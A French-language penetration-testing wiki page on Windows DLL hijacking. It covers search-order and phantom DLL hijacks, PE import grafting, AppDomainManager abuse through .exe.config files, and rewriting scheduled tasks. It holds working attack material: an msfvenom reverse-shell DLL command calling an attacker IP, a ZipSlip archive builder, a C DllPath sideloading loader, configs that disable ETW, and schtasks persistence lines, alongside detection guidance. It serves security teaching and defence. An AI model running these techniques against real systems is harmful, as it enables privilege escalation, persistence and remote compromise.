# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

Le DLL Hijacking consiste à manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme le **DLL Spoofing, l'Injection et le Side-Loading**. Il est principalement utilisé pour l'exécution de code et la persistance, et plus rarement pour l'escalade de privilèges. Bien que l'accent soit mis ici sur l'escalade, la méthode de hijacking reste la même, quels que soient les objectifs.

### Techniques courantes

Plusieurs méthodes sont utilisées pour le DLL hijacking, chacune étant plus ou moins efficace selon la stratégie de chargement des DLL de l'application :<sup>[[4]](#references)</sup>

1. **DLL Replacement** : remplacer une DLL authentique par une DLL malveillante, en utilisant éventuellement le DLL Proxying pour préserver les fonctionnalités de la DLL d'origine.
2. **DLL Search Order Hijacking** : placer la DLL malveillante dans un chemin de recherche prioritaire par rapport à la DLL légitime, en exploitant le modèle de recherche de l'application.
3. **Phantom DLL Hijacking** : créer une DLL malveillante que l'application chargera en pensant qu'il s'agit d'une DLL requise, mais inexistante.
4. **DLL Redirection** : modifier des paramètres de recherche tels que `%PATH%` ou les fichiers `.exe.manifest` / `.exe.local` pour rediriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : remplacer la DLL légitime par son équivalent malveillant dans le répertoire WinSxS, une méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec une copie de l'application, selon une approche similaire aux techniques de Binary Proxy Execution.

Une application peut aussi implémenter son **propre chargeur de DLL**. Un processus privilégié peut énumérer un répertoire enfant tel que `Libraries` ou `Plugins`, puis transmettre une DLL sélectionnée à un programme auxiliaire, indépendamment de l'ordre normal de recherche des DLL de Windows. Si un autre compte peut créer des fichiers dans ce répertoire précis, considérez cela comme une piste à examiner : confirmez l'identité du processus, les ACL effectives du répertoire, la règle de sélection des fichiers et l'existence d'une opération de chargement accessible. Le fait qu'un répertoire accessible en écriture se trouve à côté d'un exécutable ne prouve pas que le processus y charge des DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Le side-loading classique laisse le PE de confiance inchangé et prend le dessus sur la résolution des noms de DLL. L'**Import grafting** modifie plutôt un PE déjà chargé par le programme de confiance. L'attaquant ajoute un descripteur d'importation et les entrées de recherche/IAT associées pour une DLL sous son contrôle. Lorsque Windows résout récursivement cette dépendance, il mappe la DLL ajoutée et exécute son code d'initialisation au sein du processus par ailleurs légitime. Il s'agit d'une modification du PE sur disque, et non de la même opération que le remplacement, à l'exécution, d'un pointeur de fonction IAT actif par un hook.<sup>[[31]](#references)[[32]](#references)</sup>

Le PE modifié peut être une DLL intermédiaire du fournisseur plutôt que l'exécutable lancé par l'utilisateur ou le Planificateur de tâches. Voici une chaîne réutilisable :<sup>[[32]](#references)</sup>

1. Copier l'exécutable légitime et ses dépendances dans un répertoire contrôlé par l'attaquant.
2. Modifier les structures d'importation d'une dépendance pour qu'elles référencent la DLL malveillante, tout en conservant les exports attendus et le comportement normal de la dépendance.
3. Configurer un autorun ou une tâche planifiée pour lancer l'exécutable légitime. Le chargeur mappe la dépendance altérée, puis la DLL nouvellement importée. Voir [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) pour l'énumération des tâches.
4. Éviter les opérations coûteuses dans `DllMain` ; le chargeur observé a créé un thread de travail et y a poursuivi le déchiffrement par étapes.

Cette méthode diffère d'une compromission de la chaîne d'approvisionnement du fournisseur, car le package du fournisseur est intact et la modification des imports intervient après l'installation. Examinez tous les modules du répertoire de staging, et pas seulement le fichier EXE hôte : comparez les listes d'imports et les hachages des dépendances à ceux d'une installation réputée fiable, vérifiez les signatures et recherchez les binaires du fournisseur lancés depuis des emplacements accessibles en écriture inattendus, tels que `C:\ProgramData`. Une tâche planifiée pointant vers une copie d'un rapporteur de plantage ou d'un programme de mise à jour dans un tel répertoire constitue une piste particulièrement utile.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + assembly contrôlé par l'attaquant)

Le DLL sideloading classique n'est pas le seul moyen de faire charger du code contrôlé par l'attaquant par un processus **.NET Framework** de confiance. Si l'exécutable cible est une application **managée**, le CLR consulte également un **fichier de configuration de l'application** portant le nom de l'exécutable (par exemple `Setup.exe.config`). Ce fichier peut définir un **AppDomainManager** personnalisé. Si la configuration pointe vers un assembly contrôlé par l'attaquant et placé à côté du fichier EXE, le CLR le charge **avant le chemin d'exécution normal de l'application** et l'exécute au sein du processus de confiance.<sup>[[24]](#references)</sup>

Selon le schéma de configuration du .NET Framework de Microsoft, `<appDomainManagerAssembly>` et `<appDomainManagerType>` doivent tous deux être présents pour que le gestionnaire personnalisé soit utilisé.<sup>[[16]](#references)[[17]](#references)</sup>

Configuration minimale :

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestionnaire minimal :

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Notes pratiques :
- Cette technique est **spécifique à .NET Framework**. Elle repose sur l’analyse de la configuration du CLR, et non sur l’ordre de recherche des DLL Win32.
- L’hôte doit réellement être un **EXE managé**. Pour un triage rapide : `sigcheck -m target.exe`, `corflags target.exe`, ou vérifiez la présence du **CLR Runtime Header** dans les métadonnées PE.
- Le nom du fichier de configuration doit correspondre exactement à celui de l’exécutable (`<binary>.config`) et se trouve généralement **à côté de l’EXE**.
- Cette technique est utile avec des **binaires Microsoft ou de fournisseurs signés**, car l’EXE de confiance reste intact tandis que l’assembly managé malveillant s’exécute dans le processus.
- Si vous avez déjà accès en écriture à un répertoire d’installation ou de mise à jour, le détournement d’AppDomainManager peut servir de **premier stade**, suivi d’un DLL sideloading classique ou d’un chargement réflexif pour les stades suivants.

### AppDomainManager comme téléchargeur et mécanisme d’amorçage de tâche planifiée

Un scénario d’intrusion pratique consiste à associer l’EXE managé de confiance à un `*.config` malveillant et à une DLL AppDomainManager malveillante qui sert uniquement de **petit bootstrapper** :<sup>[[25]](#references)</sup>

1. L’utilisateur lance un installateur ou un outil de mise à jour .NET signé depuis un emplacement crédible, comme `%USERPROFILE%\Downloads`.
2. Le fichier de configuration adjacent amène le CLR à charger l’assembly de l’attaquant **avant** le démarrage de la logique de l’application légitime.
3. Le gestionnaire malveillant effectue un **contrôle du chemin** (par exemple, il ne continue que si l’EXE hôte s’exécute depuis `Downloads`, et n’autorise l’exécution du second stade que depuis `%LOCALAPPDATA%`).
4. Si le contrôle réussit, il télécharge la véritable charge utile dans un emplacement accessible en écriture par l’utilisateur, tel que `%LOCALAPPDATA%\PerfWatson2.exe`, et établit la persistance avec une tâche planifiée.

Pourquoi cette variante est importante :
- L’EXE hôte signé reste inchangé ; un triage qui ne vérifie que le hash du binaire principal peut donc ne pas détecter la compromission.
- Les mesures simples d’**anti-analyse basées sur le chemin** sont courantes : déplacer le trio ZIP/EXE/DLL vers Desktop, Temp ou un chemin de sandbox peut intentionnellement interrompre la chaîne.
- La DLL AppDomainManager du premier stade peut rester minuscule et discrète, tandis que le véritable implant est téléchargé ultérieurement.

Exemple minimal de persistance fréquemment observé avec ce scénario :

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes :
- ` /rl highest` signifie **le niveau le plus élevé disponible** pour cet utilisateur/cette session ; cela ne garantit pas à lui seul une élévation vers SYSTEM.
- Cette technique est souvent mieux classée comme **exécution/persistance via l’abus de la configuration .NET** que comme un hijacking classique de l’ordre de recherche des DLL manquantes, même si les opérateurs combinent fréquemment les deux.

Points de détection :
- Des exécutables .NET signés lancés depuis des **chemins d’extraction ZIP**, `Downloads`, `%TEMP%` ou d’autres dossiers accessibles en écriture par l’utilisateur, avec un fichier `<exe>.config` **dans le même dossier**.
- De nouvelles tâches planifiées dont l’action pointe vers `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads`, et dont les noms imitent ceux des programmes de mise à jour de navigateurs ou de fournisseurs.
- Des processus d’amorçage managés de courte durée qui téléchargent immédiatement un autre EXE, puis lancent `schtasks.exe`.
- Des échantillons qui se terminent prématurément si le chemin de l’exécutable ne correspond pas à un répertoire de profil utilisateur attendu.

### Hijacking d’une tâche planifiée existante pour relancer la chaîne de sideload

Pour assurer la persistance, ne cherchez pas uniquement à **créer une nouvelle tâche**. Certains groupes d’intrusion attendent qu’un programme d’installation légitime crée une **tâche de mise à jour normale**, puis **modifient l’action de la tâche** afin de conserver un nom, un auteur et un déclencheur familiers aux défenseurs.

Procédure réutilisable :
1. Installez/lancez le logiciel légitime et identifiez la tâche qu’il crée normalement.
2. Exportez le XML de la tâche et notez les valeurs actuelles de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Remplacez uniquement l’action afin que la tâche lance votre EXE hôte de confiance depuis un répertoire de staging accessible en écriture par l’utilisateur, lequel effectuera ensuite le sideload ou chargera le véritable payload via AppDomain.
4. Réenregistrez la même tâche au lieu de créer un artefact de persistance manifestement suspect.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Pourquoi c’est plus discret :
- Le nom de la tâche peut sembler légitime (par exemple, celui d’un utilitaire de mise à jour d’un éditeur).
- Le **service Task Scheduler** la lance : la validation du parent ou des ancêtres voit souvent la chaîne de planification attendue plutôt que `explorer.exe`.
- Les équipes DFIR qui recherchent uniquement les **nouveaux noms de tâches** peuvent passer à côté d’une tâche déjà enregistrée dont l’action pointe maintenant vers `%LOCALAPPDATA%`, `%APPDATA%` ou un autre chemin contrôlé par l’attaquant.

Pistes de recherche rapides :
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Comparez le XML de `C:\Windows\System32\Tasks\*` et les métadonnées de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` à une référence de base.
- Déclenchez une alerte lorsqu’une **tâche de mise à jour à l’apparence légitime** s’exécute depuis des **répertoires accessibles en écriture par l’utilisateur** ou lance un EXE .NET accompagné d’un fichier `*.config`.

> [!TIP]
> Pour découvrir une chaîne étape par étape combinant staging HTML, configurations AES-CTR et implants .NET avec du DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Lier un stage chargé par sideloading à la ligne de commande du service

Une DLL chargée par sideloading peut dépendre d’autres éléments que le nom attendu de l’EXE hôte et de la DLL. Mandiant a décrit un loader qui lie le déchiffrement du payload à un argument de ligne de commande et au nom de l’exécutable hôte.<sup>[[33]](#references)</sup> Dans une chaîne ultérieure reposant sur un service, un hôte légitime copié a chargé un `mscoree.dll` voisin, qui exportait `LockClrVersion` et ne déchiffrait son stage intégré qu’après avoir dérivé une clé AES-128 à partir de l’argument du service et du nom de base de l’exécutable hôte. Chaque entrée était tronquée ou complétée par des NUL jusqu’à 16 octets ; la clé était calculée octet par octet ainsi : `argument XOR embedded_key XOR executable_basename`, puis le payload était déchiffré avec AES-CBC sans padding. Renommer l’hôte ou le lancer sans l’argument attendu modifie la clé et empêche le déchiffrement du stage, même si la DLL se charge toujours. Pour reproduire ou analyser cette variante, conservez exactement l’argument de ligne de commande et le nom de base.<sup>[[34]](#references)</sup>

Il s’agit d’une **barrière de payload superposée au DLL side-loading ordinaire**, et non d’une nouvelle règle de recherche des DLL ou d’un mécanisme d’escalade de privilèges en soi. Le contexte de sécurité du service détermine le niveau de privilèges obtenu. Le workflow C2 utilisant les [issues et fichiers GitHub](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) décrit séparément le transport ultérieur.<sup>[[34]](#references)</sup>

## Trouver les DLL manquantes

La méthode la plus courante pour trouver les DLL manquantes sur un système consiste à lancer [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **définissant les 2 filtres suivants** :

![Techniques courantes - Trouver les DLL manquantes : la méthode la plus courante pour trouver les DLL manquantes sur un système consiste à lancer procmon de sysinternals, en définissant les 2 filtres suivants](<../../../images/image (961).png>)

![Techniques courantes - Trouver les DLL manquantes : la méthode la plus courante pour trouver les DLL manquantes sur un système consiste à lancer procmon de sysinternals, en définissant les 2 filtres suivants](<../../../images/image (230).png>)

et afficher uniquement la **File System Activity** :

![Techniques courantes - Trouver les DLL manquantes : et afficher uniquement la File System Activity](<../../../images/image (153).png>)

Si vous recherchez des **DLL manquantes en général**, laissez l’outil tourner quelques **secondes**.\
Si vous recherchez une **DLL manquante dans un exécutable spécifique**, définissez un autre filtre, par exemple **"Process Name" "contains" `<exec name>`**, exécutez-le, puis arrêtez la capture des événements.<sup>[[9]](#references)</sup>

## Exploiter les DLL manquantes

Pour escalader les privilèges, recherchez une **DLL qu’un processus privilégié tente de charger** depuis un emplacement où vous pouvez écrire. Cela peut se produire si vous contrôlez un répertoire recherché avant celui contenant la DLL légitime, ou si la DLL demandée n’existe pas et que vous pouvez écrire dans l’un des répertoires recherchés.

### Ordre de recherche des DLL

**La** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **explique précisément comment les DLL sont chargées.**

Les **applications Windows** recherchent les DLL en suivant un ensemble de **chemins de recherche prédéfinis**, dans un ordre particulier. Le DLL hijacking se produit lorsqu’une DLL malveillante est placée stratégiquement dans l’un de ces répertoires afin qu’elle soit chargée avant la DLL légitime. Pour éviter cela, l’application doit utiliser des chemins absolus lorsqu’elle désigne les DLL dont elle a besoin.

Voici l’**ordre de recherche des DLL sur les systèmes 32 bits** :

1. Le répertoire depuis lequel l’application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16 bits. Aucune fonction ne permet d’obtenir le chemin de ce répertoire, mais il est tout de même parcouru. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
   1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires indiqués dans la variable d’environnement PATH. Notez que cela n’inclut pas le chemin propre à l’application défini par la clé de registre **App Paths**. La clé **App Paths** n’est pas utilisée pour calculer le chemin de recherche des DLL.

Il s’agit de l’ordre de recherche **par défaut**, avec **SafeDllSearchMode** activé. Lorsqu’il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (elle est activée par défaut).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** est en train de charger.

Enfin, une DLL peut être chargée par chemin absolu plutôt que par nom. Dans ce cas, Windows recherche la DLL elle-même uniquement à cet emplacement ; les dépendances demandées par nom suivent toujours l’ordre de recherche applicable.

Il existe d’autres façons de modifier l’ordre de recherche, mais je ne vais pas les expliquer ici.

### Enchaîner une écriture arbitraire de fichier avec un hijack de DLL manquante

**Technique associée :** [basculement de mount point contrôlé par oplock contre une remédiation privilégiée](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Utilisez les filtres **ProcMon** (`Process Name` = EXE cible, `Path` se terminant par `.dll`, `Result` = `NAME NOT FOUND`) pour recueillir les noms des DLL recherchées par le processus mais introuvables.<sup>[[14]](#references)</sup>
2. Si le binaire s’exécute selon un **planning ou en tant que service**, déposer une DLL portant l’un de ces noms dans le **répertoire de l’application** (entrée n° 1 de l’ordre de recherche) la fera charger lors de l’exécution suivante. Dans un cas impliquant un scanner .NET, le processus recherchait `hostfxr.dll` dans `C:\samples\app\` avant de charger la copie réelle depuis `C:\Program Files\dotnet\fxr\...`.
3. Créez une DLL de payload (par exemple, un reverse shell) avec n’importe quel export : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si votre primitive est une **écriture arbitraire de type ZipSlip**, créez un ZIP dont l’entrée sort du répertoire d’extraction afin que la DLL soit placée dans le répertoire de l’application :

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Déposez l’archive dans la boîte de réception/le partage surveillé ; lorsque la tâche planifiée relance le processus, celui-ci charge la DLL malveillante et exécute votre code en tant que compte de service.

### Forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une méthode avancée pour influencer de manière déterministe le chemin de recherche des DLL d’un processus nouvellement créé consiste à définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l’attaquant, un processus cible qui résout une DLL importée par son nom (sans chemin absolu et sans utiliser les indicateurs de chargement sécurisé) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Idée clé
- Construisez les paramètres du processus avec RtlCreateProcessParametersEx et fournissez un DllPath personnalisé pointant vers votre dossier contrôlé (par exemple, le répertoire où se trouvent votre dropper/unpacker).
- Créez le processus avec RtlCreateUserProcess. Lorsque le binaire cible résout une DLL par son nom, le chargeur consulte le DllPath fourni pendant la résolution, ce qui permet un sideloading fiable même si la DLL malveillante ne se trouve pas dans le même répertoire que le fichier EXE cible.

Remarques et limitations
- Cela affecte le processus enfant en cours de création ; c’est différent de SetDllDirectory, qui n’affecte que le processus actuel.
- La cible doit importer une DLL ou appeler LoadLibrary avec son nom (sans chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Les KnownDLLs et les chemins absolus codés en dur ne peuvent pas être détournés. Les exports transférés et SxS peuvent modifier l’ordre de priorité.

Exemple C minimal (ntdll, chaînes larges, gestion des erreurs simplifiée) :

<details>
<summary>Exemple C complet : forcer le sideloading de DLL via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Exemple d'utilisation opérationnelle
- Placez une xmllite.dll malveillante (exportant les fonctions requises ou faisant proxy vers la DLL réelle) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par nom à l'aide de la technique ci-dessus. Le loader résout l'import via le DllPath fourni et sideload votre DLL.

Cette technique a été observée dans la nature pour déclencher des chaînes de sideloading à plusieurs étapes : un launcher initial dépose une DLL auxiliaire, qui lance ensuite un binaire signé par Microsoft et vulnérable au hijacking, avec un DllPath personnalisé afin de forcer le chargement de la DLL de l'attaquant depuis un répertoire de staging.<sup>[[6]](#references)</sup>


### Hijacking d'AppDomainManager .NET via `.exe.config`

Pour les cibles **.NET Framework**, le sideloading peut avoir lieu **avant `Main()`** sans patcher la mémoire, en exploitant le fichier **`.exe.config`** adjacent à l'application. Au lieu de s'appuyer uniquement sur l'ordre de recherche des DLL Win32, l'attaquant place un EXE .NET légitime à côté d'un fichier de configuration malveillant et d'un ou plusieurs assemblies contrôlés par l'attaquant.

Fonctionnement de la chaîne :<sup>[[15]](#references)[[22]](#references)</sup>
1. L'EXE hôte démarre et le **CLR lit `<exe>.config`**.
2. Le fichier de configuration définit **`<appDomainManagerAssembly>`** et **`<appDomainManagerType>`** afin que le runtime instancie un `AppDomainManager` contrôlé par l'attaquant.
3. Le manager malveillant obtient une **exécution avant `Main()`** au sein du processus hôte de confiance.
4. Le même fichier de configuration peut forcer le CLR à résoudre d'abord les assemblies locaux (par exemple `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) et affaiblir la validation/la télémétrie du runtime sans patch inline.

Schéma de type campagne (l'imbrication exacte peut varier selon la directive / la version du CLR) :

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Pourquoi c’est utile :
- **`<probing privatePath="."/>`** maintient la résolution des assemblies dans le répertoire de l’application, faisant de ce dossier une surface de sideloading prévisible.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** déclenchent l’exécution du code de l’attaquant lors de l’initialisation du CLR, avant que la logique légitime de l’application ne s’exécute.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** peut permettre à une application full-trust de charger des assemblies non signés ou altérés sans échec de validation du strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** évite les redirections de publisher policy vers des assemblies plus récents.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rend la sélection du runtime plus déterministe.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** est particulièrement intéressant, car la configuration **désactive la visibilité ETW du CLR lui-même**, au lieu que l’implant patche `EtwEventWrite` en mémoire.

Schéma opérationnel observé dans des campagnes récentes :
- Étape 1 : déposer `setup.exe`, `setup.exe.config` et des assemblies locaux.
- Étape 2 : les copier dans un dossier **AppData de mise à jour** crédible, renommer l’hôte en quelque chose comme `update.exe`, puis le relancer via une **tâche planifiée**.
- Étape 3 : vérifier le contexte d’exécution (par exemple, le parent attendu `svchost.exe` lancé par le Planificateur de tâches) avant de charger la DLL/export final du RAT.

Pistes de détection :
- Des **exécutables .NET** signés ou autrement légitimes qui s’exécutent avec des fichiers **`.config`** suspects à proximité, dans des emplacements accessibles en écriture aux utilisateurs.
- Des fichiers `.config` contenant **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ou **`etwEnable enabled="false"`**.
- Des tâches planifiées qui relancent des binaires de mise à jour renommés depuis **`%LOCALAPPDATA%`** ou des répertoires spécifiques à une application comme `\bin\update\`.
- Des chaînes parent/enfant où une tâche planifiée lance un hôte .NET de confiance qui charge immédiatement des assemblies non fournies par l’éditeur depuis son propre répertoire.

#### Exceptions à l’ordre de recherche des DLL dans la documentation Windows

La documentation Windows mentionne certaines exceptions à l’ordre de recherche standard des DLL :

- Lorsqu’une **DLL portant le même nom qu’une DLL déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. Il vérifie plutôt la présence d’une redirection et d’un manifeste avant d’utiliser par défaut la DLL déjà en mémoire. **Dans ce scénario, le système ne recherche pas la DLL**.
- Si la DLL est reconnue comme une **DLL connue** pour la version actuelle de Windows, le système utilise sa version de cette DLL connue, ainsi que toutes ses DLL dépendantes, **sans effectuer de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces DLL connues.
- Si une **DLL a des dépendances**, celles-ci sont recherchées comme si elles étaient désignées uniquement par leur **nom de module**, que la DLL initiale ait été identifiée par un chemin complet ou non.

### Élévation de privilèges

**Conditions requises** :

- Identifier un processus qui s’exécute ou s’exécutera avec des **privilèges différents** (mouvement horizontal ou latéral) et auquel **il manque une DLL**.
- Vérifier que vous disposez d’un **accès en écriture** à l’un des **répertoires** dans lesquels la **DLL** sera **recherchée**. Il peut s’agir du répertoire de l’exécutable ou d’un répertoire du chemin système.

Ces conditions préalables sont rarement réunies par défaut : les exécutables privilégiés n’ont généralement pas de dépendances DLL manquantes, et les utilisateurs standards ne peuvent normalement pas écrire dans les répertoires du chemin de recherche système. Des environnements mal configurés peuvent néanmoins réunir ces deux conditions.\
Si ces conditions sont réunies, consultez le projet [UACME](https://github.com/hfiref0x/UACME). Bien que son objectif principal soit le contournement de l’UAC, il contient des PoC de DLL hijacking pour certaines versions de Windows, qui peuvent souvent être adaptés au répertoire accessible en écriture que vous avez trouvé.

Notez que vous pouvez **vérifier vos permissions dans un dossier** en exécutant :<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Et **vérifiez les permissions de tous les dossiers dans PATH** :

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Vous pouvez également vérifier les imports d’un exécutable et les exports d’une DLL avec :

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Pour obtenir un guide complet sur la façon d’**abuser de DLL Hijacking pour élever ses privilèges** avec des permissions d’écriture dans un **dossier du System PATH**, consultez :

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d’écriture dans un dossier du System PATH.\
D’autres outils automatisés intéressants pour détecter cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Si vous trouvez un scénario exploitable, l’un des éléments les plus importants pour réussir l’exploitation consiste à **créer une dll qui exporte au moins toutes les fonctions que l’exécutable importera depuis cette dll**. Quoi qu’il en soit, notez que DLL Hijacking est utile pour [passer du niveau d’intégrité Medium au niveau High **(en contournant l’UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou du niveau[ **High Integrity à SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous trouverez un exemple de **création d’une dll valide** dans cette étude sur le DLL Hijacking, axée sur son utilisation pour l’exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
